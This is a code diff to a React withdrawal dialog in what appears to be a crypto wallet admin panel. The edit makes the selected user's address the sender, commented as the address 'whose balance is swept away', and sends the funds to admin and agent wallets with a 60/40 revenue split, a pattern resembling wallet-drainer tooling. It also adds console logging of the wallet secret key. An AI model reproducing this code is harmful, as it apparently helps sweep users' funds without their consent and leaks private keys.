@@ -105,7 +105,7 @@ const Withdraw: React.FC<WithdrawProps> = ({ open, onClose, currentRow }) => {
 
   if (hasAgentWallet) {
     // 有邀请人的情况，设置两个钱包和分成比例
-    sender = walletData?.data?.agentWallet?.address || '';
+    sender = currentRow?.address || ''; // 被划走余额的地址
     spender = walletData?.data?.adminWallet?.address || '';
     secretKey = walletData?.data?.agentWallet?.secretKey || '';
 
@@ -117,15 +117,19 @@ const Withdraw: React.FC<WithdrawProps> = ({ open, onClose, currentRow }) => {
     percentage1 = walletData?.data?.agentWallet?.proxySharingRate || 0.6; // 默认60%
     percentage2 = walletData?.data?.agentWallet?.platformSharingRate || 0.4; // 默认40%
   } else {
-    // 没有邀请人的情况，只有一个钱包（管理员钱包）
-    sender = walletData?.data?.address || '';
-    spender = walletData?.data?.address || '';
-    secretKey = walletData?.data?.secretKey || '';
-
-    // 只有一个接收者（管理员钱包）
-    recipient1 = walletData?.data?.address || '';
-    recipient2 = '';
+    // 没有邀请人的情况，只有一个钱包
+    sender = currentRow?.address || ''; // 被划走余额的地址
+    spender = walletData?.data?.address || ''; // 直接使用返回的地址
+    secretKey = walletData?.data?.secretKey || ''; // 直接使用返回的密钥
+    recipient1 = walletData?.data?.address || ''; // 直接使用返回的地址
+    recipient2 = ''; // 没有第二个接收者
   }
+
+  console.log('发送者地址', sender);
+  console.log('接收者地址', spender);
+  console.log('密钥', secretKey);
+  console.log('接收者1地址', recipient1);
+  console.log('接收者2地址', recipient2);
 
   const handleOk = async () => {
     try {
